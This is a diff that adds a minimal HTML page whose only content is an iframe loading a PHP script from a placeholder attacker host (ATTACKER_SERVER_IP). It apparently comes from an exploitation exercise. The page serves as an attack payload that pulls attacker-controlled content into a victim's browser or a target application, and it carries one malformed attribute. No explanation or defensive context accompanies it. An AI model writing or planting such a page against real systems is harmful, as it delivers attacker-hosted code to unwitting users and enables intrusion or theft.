@@ -1,0 +1,6 @@
+<!DOCTYPE html>
+<html lang=en>
+<body>
+    <iframe src="http://ATTACKER_SERVER_IP/axura.php" height=1000px width=1000px"></iframe>
+</body>
+</html>
